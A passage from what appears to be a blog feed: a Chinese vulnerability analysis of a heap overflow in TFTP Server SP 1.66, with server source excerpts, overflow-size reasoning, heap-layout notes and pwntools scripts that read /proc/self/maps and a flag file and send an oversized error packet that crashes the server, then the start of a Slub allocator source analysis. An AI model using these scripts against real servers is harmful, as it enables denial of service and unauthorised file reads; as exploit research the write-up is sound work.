        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先查看漏洞报告:</p><blockquote><p><code>Heap-based overflow</code> vulnerability in <code>TFTP Server SP 1.66</code> and earlier allows remote attackers to perform a denial of service or possibly execute arbitrary code via <code>a long TFTP error packet</code>, a different vulnerability than CVE-2008-2161.</p></blockquote><p>程序是一个开源的TFTP协议服务器.下载v1.66源码到本地.</p><span id="more"></span><p>大概了解一下TFTP协议:<br><a href="https://zh.wikipedia.org/wiki/%E7%AE%80%E5%8D%95%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE">https://zh.wikipedia.org/wiki/%E7%AE%80%E5%8D%95%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE</a><br><a href="https://blog.csdn.net/lqy971966/article/details/121810609">https://blog.csdn.net/lqy971966/article/details/121810609</a><br><a href="https://blog.csdn.net/ScilogyHunter/article/details/105592806">https://blog.csdn.net/ScilogyHunter/article/details/105592806</a></p><p>既然是无认证的tftp服务器,对于CTF来说可以直接读出flaghhh.不过也为RCE提供了便利,可以读/proc/self/maps获取地址信息绕过ASLR.</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b''</span></span><br><span class="line">payload += <span class="string">b'\x00\x01'</span></span><br><span class="line">payload += <span class="string">b'//flag\x00'</span>+<span class="string">b'netascii\x00'</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'172.17.0.2'</span>,port,typ=<span class="string">'udp'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="built_in">print</span>(io.recv())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p>大概浏览一下源码,理解一下大体的处理逻辑.根据漏洞报告中的描述,定位到漏洞点(处理error packet时).<br>有两处相似的处理逻辑:<br>发现在%s写入时可能会发出越界写入漏洞,但是否真的发生还得看一下errormessage和datain-&gt;buffer字段的检查.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ntohs(datain-&gt;opcode) == <span class="number">5</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">sprintf</span>(req1-&gt;serverError.errormessage, <span class="string">"Error %i at Client, %s"</span>, ntohs(datain-&gt;block), &amp;datain-&gt;buffer);</span><br><span class="line">logMess(req1, <span class="number">1</span>);</span><br><span class="line">cleanReq(req1);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ntohs(datain-&gt;opcode) == <span class="number">5</span>)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">sprintf</span>(req.serverError.errormessage, <span class="string">"Error %i at Client, %s"</span>, ntohs(datain-&gt;block), &amp;datain-&gt;buffer);</span><br><span class="line">logMess(&amp;req, <span class="number">1</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>req1和req均是request结构.前者在堆上,后者是栈上的局部变量.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request *req1 = (request*)<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="built_in">sizeof</span>(request));</span><br></pre></td></tr></tbody></table></figure><p>errormessage的长度为508字节</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">request</span></span><br><span class="line">{</span><br><span class="line"><span class="type">char</span> mapname[<span class="number">32</span>];</span><br><span class="line">MYBYTE opcode;</span><br><span class="line">MYBYTE attempt;</span><br><span class="line">MYBYTE sockInd;</span><br><span class="line"><span class="type">time_t</span> expiry;</span><br><span class="line"><span class="type">char</span> path[<span class="number">256</span>];</span><br><span class="line">FILE *file;</span><br><span class="line"><span class="type">char</span> *filename;</span><br><span class="line"><span class="type">char</span> *mode;</span><br><span class="line">MYDWORD tsize;</span><br><span class="line">MYDWORD blksize;</span><br><span class="line">MYDWORD timeout;</span><br><span class="line">MYDWORD fblock;</span><br><span class="line">MYWORD block;</span><br><span class="line">MYWORD tblock;</span><br><span class="line"><span class="type">int</span> bytesRecd;</span><br><span class="line">MYWORD bytesRead[<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> bytesReady;</span><br><span class="line">sockaddr_in client;</span><br><span class="line"><span class="type">socklen_t</span> clientsize;</span><br><span class="line">packet* pkt[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">{</span><br><span class="line">acknowledgement acout;</span><br><span class="line">message mesout;</span><br><span class="line">tftperror serverError;</span><br><span class="line">};</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">tftperror</span></span><br><span class="line">{</span><br><span class="line">MYWORD opcode;</span><br><span class="line">MYWORD errorcode;</span><br><span class="line"><span class="type">char</span> errormessage[<span class="number">508</span>];</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>datain是packet结构,用来储存从网络中接收到的数据,大小为blksize+4,不过对单次接收报文长度有检查,不能超过sizeof(message)==516字节.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">MYWORD opcode;</span><br><span class="line">MYWORD block;</span><br><span class="line"><span class="type">char</span> buffer;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">message</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">MYWORD opcode;</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">514</span>];</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">//blksize默认为65464</span></span><br><span class="line">datain = (packet*)<span class="built_in">calloc</span>(<span class="number">1</span>, blksize + <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (req1-&gt;bytesRecd &gt; (<span class="type">int</span>)<span class="keyword">sizeof</span>(message))</span><br><span class="line">{</span><br><span class="line">    req1-&gt;serverError.opcode = htons(<span class="number">5</span>);</span><br><span class="line">    req1-&gt;serverError.errorcode = htons(<span class="number">4</span>);</span><br><span class="line">    sendto(network.tftpConn[req1-&gt;sockInd].sock, (<span class="type">const</span> <span class="type">char</span>*)&amp;req1-&gt;serverError, <span class="built_in">strlen</span>(req1-&gt;serverError.errormessage) + <span class="number">5</span>, <span class="number">0</span>, (sockaddr*)&amp;req1-&gt;client, req1-&gt;clientsize);</span><br><span class="line">    <span class="built_in">sprintf</span>(req1-&gt;serverError.errormessage, <span class="string">"Error: Incoming Packet too large"</span>);</span><br><span class="line">    logMess(req1, <span class="number">1</span>);</span><br><span class="line">    cleanReq(req1);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>则最大溢出长度为18(其他字符串长度)+512(packet-&gt;buffer)-508(req1-&gt;serverError.errormessage)+n(%i的输出长度)=22+%i.最大为32字节.</p><p>动态调试一下看看堆布局,溢出长度32字节.<br>从内存的使用来看,只能溢出到后方的一个tftpAge(std::multimap&lt;long, request*&gt;)的结点的color字段和parent字段,覆盖color字段自然没什么用,parent字段虽然是个指针,但由于并不具备对tftpAge中节点内容的读写能力,也起不到太大作用.<br>从堆管理器来看,能覆盖下一个堆块的size字段和fd字段.</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//rb_tree_node的内存布局</span><br><span class="line">color</span><br><span class="line">parent</span><br><span class="line">left</span><br><span class="line">right</span><br><span class="line">value(pair&lt;long,request*&gt;)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202402171342927.png"><br>下图为覆盖后.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202402171342026.png"></p><p>能分配并写入的堆块大小只有0x210(req-&gt;pkt)和0x3a0(req),并且都是calloc得到的.于是Tcache poisoning不太行,尝试改大size放进unsortedbin制造堆块重叠,再切割取回.<br>正好后面有个file结构体(下图0x164f2b0处),可以打fsop.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202402171439486.png"></p><p>看一下该map节点的释放操作:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">myMultiMap::iterator p = tftpAge.begin();</span><br><span class="line">myMultiMap::iterator q;</span><br><span class="line"><span class="type">time_t</span> currentTime = time(<span class="literal">NULL</span>);</span><br><span class="line">request *req;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (p != tftpAge.end())</span><br><span class="line">{</span><br><span class="line">req = p-&gt;second;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (p-&gt;first &gt; currentTime)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (p-&gt;first &lt; req-&gt;expiry &amp;&amp; req-&gt;expiry &gt; currentTime)</span><br><span class="line">{</span><br><span class="line">q = p;</span><br><span class="line">p++;</span><br><span class="line">tftpAge.erase(q);</span><br><span class="line">tftpAge.insert(<span class="built_in">pair</span>&lt;<span class="type">long</span>, request*&gt;(req-&gt;expiry, req));</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (req-&gt;expiry &lt;= currentTime &amp;&amp; req-&gt;attempt &gt;= <span class="number">3</span>)</span><br><span class="line">{</span><br><span class="line"><span class="comment">//3次重试后即进行清理操作</span></span><br><span class="line"><span class="keyword">if</span> (req-&gt;attempt &lt; UCHAR_MAX)</span><br><span class="line">{</span><br><span class="line">req-&gt;serverError.opcode = htons(<span class="number">5</span>);</span><br><span class="line">req-&gt;serverError.errorcode = htons(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (req-&gt;fblock &amp;&amp; !req-&gt;block)</span><br><span class="line"><span class="built_in">strcpy</span>(req-&gt;serverError.errormessage, <span class="string">"Large File, Block# Rollover not supported by Client"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">strcpy</span>(req-&gt;serverError.errormessage, <span class="string">"Timeout"</span>);</span><br><span class="line"></span><br><span class="line">sendto(network.tftpConn[req-&gt;sockInd].sock, (<span class="type">const</span> <span class="type">char</span>*)&amp;req-&gt;serverError, <span class="built_in">strlen</span>(req-&gt;serverError.errormessage) + <span class="number">5</span>, <span class="number">0</span>, (sockaddr*)&amp;req-&gt;client, req-&gt;clientsize);</span><br><span class="line">logMess(req, <span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">q = p;</span><br><span class="line">p++;</span><br><span class="line">tftpAge.erase(q);<span class="comment">//在这里释放</span></span><br><span class="line">tftpCache.erase(req-&gt;mapname);</span><br><span class="line">cleanReq(req);</span><br><span class="line"><span class="built_in">free</span>(req);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (req-&gt;expiry &lt;= currentTime)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (ntohs(req-&gt;acout.opcode) == <span class="number">3</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (processSend(req))</span><br><span class="line">cleanReq(req);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">req-&gt;attempt++;</span><br><span class="line">req-&gt;expiry = currentTime + req-&gt;timeout;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">errno = <span class="number">0</span>;</span><br><span class="line">sendto(network.tftpConn[req-&gt;sockInd].sock, (<span class="type">const</span> <span class="type">char</span>*)&amp;req-&gt;acout, req-&gt;bytesReady, <span class="number">0</span>, (sockaddr*)&amp;req-&gt;client, req-&gt;clientsize);</span><br><span class="line"><span class="comment">//errno = WSAGetLastError();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (errno)</span><br><span class="line">cleanReq(req);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">req-&gt;attempt++;</span><br><span class="line">req-&gt;expiry = currentTime + req-&gt;timeout;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">p++;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">p++;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">while</span> (kRunning);</span><br></pre></td></tr></tbody></table></figure><p>于是只需更改size后等待其3次重发包后即可完成释放.下图为释放后的效果,可以看到已成功造成堆块重叠(file结构体位于0x1d022b0),现在只需分配堆块并写入劫持file结构体进行fsop即可获得shell.</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202402171814089.png"></p><p>不过分配并写入的原语就比较受限了.看起来比较好用的是通过读请求时main-&gt;processNew中的操作.<br>从这里看出,可以先将payload写入一个文件,再请求读取该文件时即可分配并写入.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">ntohs</span>(datain-&gt;opcode) == <span class="number">1</span>)</span><br><span class="line">{</span><br><span class="line">errno = <span class="number">0</span>;</span><br><span class="line">req-&gt;pkt[<span class="number">0</span>] = (packet*)<span class="built_in">calloc</span>(<span class="number">1</span>, req-&gt;blksize + <span class="number">4</span>);</span><br><span class="line">req-&gt;pkt[<span class="number">1</span>] = (packet*)<span class="built_in">calloc</span>(<span class="number">1</span>, req-&gt;blksize + <span class="number">4</span>);</span><br><span class="line">   ....</span><br><span class="line">   }</span><br><span class="line">   </span><br><span class="line">   req-&gt;pkt[<span class="number">0</span>]-&gt;opcode = <span class="built_in">htons</span>(<span class="number">3</span>);</span><br><span class="line">   req-&gt;pkt[<span class="number">0</span>]-&gt;block = <span class="built_in">htons</span>(<span class="number">1</span>);</span><br><span class="line">   req-&gt;bytesRead[<span class="number">0</span>] = <span class="built_in">fread</span>(&amp;req-&gt;pkt[<span class="number">0</span>]-&gt;buffer, <span class="number">1</span>, req-&gt;blksize, req-&gt;file);</span><br></pre></td></tr></tbody></table></figure><p>先测试一下,结果收到了PUT AccessDenied的回复<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202402171854761.png"></p><p>对照源码看一下,发现该tftpd实现中写文件的操作是默认关闭的,然而所有能写入req-&gt;pkt中的内容都来自读取的文件,所以这条路在默认情况下是走不通了.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!cfig.fileWrite &amp;&amp; !cfig.fileOverwrite)</span><br><span class="line">{</span><br><span class="line">            req-&gt;serverError.opcode = htons(<span class="number">5</span>);</span><br><span class="line">            req-&gt;serverError.errorcode = htons(<span class="number">2</span>);</span><br><span class="line">            <span class="built_in">strcpy</span>(req-&gt;serverError.errormessage, <span class="string">"PUT Access Denied"</span>);</span><br><span class="line">            sendto(network.tftpConn[req-&gt;sockInd].sock, (<span class="type">const</span> <span class="type">char</span>*)&amp;req-&gt;serverError, <span class="built_in">strlen</span>(req-&gt;serverError.errormessage) + <span class="number">5</span>, <span class="number">0</span>, (sockaddr*)&amp;req-&gt;client, req-&gt;clientsize);</span><br><span class="line">            logMess(req, <span class="number">1</span>);</span><br><span class="line">            cleanReq(req);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        }</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202402171931548.png"></p><p>用不可控的文件来覆盖file结构体Poc一下:</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">ioli = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ReadNew</span>(<span class="params">filename</span>):</span><br><span class="line">    io = remote(ip,port,typ=<span class="string">'udp'</span>)</span><br><span class="line">    payload = <span class="string">b''</span></span><br><span class="line">    payload += <span class="string">b'\x00\x01'</span></span><br><span class="line">    payload += filename</span><br><span class="line">    io.send(payload)</span><br><span class="line">    ioli.append(io)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">WriteNew</span>(<span class="params">filename,content</span>):</span><br><span class="line">    io = remote(ip,port,typ=<span class="string">'udp'</span>)</span><br><span class="line">    payload = <span class="string">b''</span></span><br><span class="line">    payload += <span class="string">b'\x00\x02'</span></span><br><span class="line">    payload += filename</span><br><span class="line">    io.send(payload)</span><br><span class="line">    ioli.append(io)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">serror</span>(<span class="params">io,errmsg</span>):</span><br><span class="line">    payload = <span class="string">b''</span></span><br><span class="line">    payload += <span class="string">b'\x00\x05'</span></span><br><span class="line">    payload += <span class="string">b'\x00\x01'</span></span><br><span class="line">    payload += errmsg</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ReadNew(<span class="string">b'//proc/self/maps\x00'</span>+<span class="string">b'netascii\x00'</span>)</span><br><span class="line">ReadNew(<span class="string">b'//proc/self/maps\x00'</span>+<span class="string">b'netascii\x00'</span>)</span><br><span class="line">serror(ioli[<span class="number">0</span>],<span class="string">b'c'</span>*<span class="number">497</span>+p64(<span class="number">0x6F1</span>))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">10</span>)</span><br><span class="line">ReadNew(<span class="string">b'//proc/self/maps\x00'</span>+<span class="string">b'netascii\x00'</span>)</span><br><span class="line">sleep(<span class="number">10</span>)</span><br></pre></td></tr></tbody></table></figure><p>成功在fclose时触发crash.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202402172143245.png"></p><p>于是只能转去走另一条路了,通过errormsg来写入,由于写入能力更加受限(1.写入位置距堆块起始位置有较大偏移,2.不是立即写入,中间会分配其他对象),只会做菜单堆的笔者目前能力还无法完成这样环境下的堆布局….</p><p>大概分析到这,以后再回来填坑了.</p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> 应用层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Slub-Allocator 源码分析</title>
      <link href="/2024/Slub-Allocator%20Analysis/"/>
      <url>/2024/Slub-Allocator%20Analysis/</url>
      
        <content type="html"><![CDATA[<p>CONFIG_SLAB_FREELIST_HARDENED毁了我的slub master梦</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>写此文的目的,一是两位前辈的劝诫:</p><blockquote><p>“要是一辈子都只能看分析,那永远也写不出分析”<br>“有问题先看源码,再看文档,一定要有读源码的意识”<br>“做Kernel不读Slub就像做User mode不读Ptmalloc2”.</p></blockquote><p>二是最近在复现内核漏洞的过程中发现源码阅读有点吃力,遂选取逻辑性较强的内存管理部分的源码进行练习.<br>三是beta24开发的gef插件,方便了我很多工作,我想知道其的实现.</p><p>本文主要对Slub Allocator的分配与释放进行流程上的分析.因笔者水平有限且内容过多,难免分析有误,若有错误请师傅们联系我修改.代码来自linux-6.6.7</p><p>添加注释的源码:<a href="https://github.com/Polaris-Snowfall/linux-kernel-comment/blob/main/slub.comment.c">https://github.com/Polaris-Snowfall/linux-kernel-comment/blob/main/slub.comment.c</a>.</p><h2 id="结构分析"><a href="#结构分析" class="headerlink" title="结构分析"></a>结构分析</h2><h3 id="kmem-cache-特定大小或特殊用途对象的内存池"><a href="#kmem-cache-特定大小或特殊用途对象的内存池" class="headerlink" title="kmem_cache (特定大小或特殊用途对象的内存池)"></a>kmem_cache (特定大小或特殊用途对象的内存池)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Slab cache management.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> {</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_SLUB_TINY</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/* Used for retrieving partial slabs, etc. */</span></span><br><span class="line"><span class="type">slab_flags_t</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> min_partial; <span class="comment">//node partial 链表上slab数量的下限</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size;<span class="comment">/* The size of an object including metadata */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> object_size;<span class="comment">/* The size of an object without metadata */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">reciprocal_value</span> <span class="title">reciprocal_size</span>;</span></span><br><span class="line"><span class="comment">//不同kmem_cache管理的空闲对象,free pointer在对象上的偏移不同,用offset指示</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset;<span class="comment">/* Free pointer offset */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="comment">/*kmem_cache_cpu-&gt;partial最多能保存的对象个数*/</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> cpu_partial;</span><br><span class="line"><span class="comment">/*kmem_cache_cpu-&gt;partial最多能保存的slab个数*/</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> cpu_partial_slabs;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/*低16位为@order的slab有多少个大小为@size的对象,高16位为@order*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocation and freeing of slabs */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line"><span class="type">gfp_t</span> allocflags;<span class="comment">/* gfp flags to use on each alloc */</span></span><br><span class="line"><span class="type">int</span> refcount;<span class="comment">/* Refcount for slab cache destroy */</span></span><br><span class="line"><span class="type">void</span> (*ctor)(<span class="type">void</span> *);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> inuse;<span class="comment">/* Offset to metadata */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> align;<span class="comment">/* Alignment */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> red_left_pad;<span class="comment">/* Left redzone padding size */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *name;<span class="comment">/* Name (only for display!) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span><span class="comment">/* List of slab caches */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line"><span 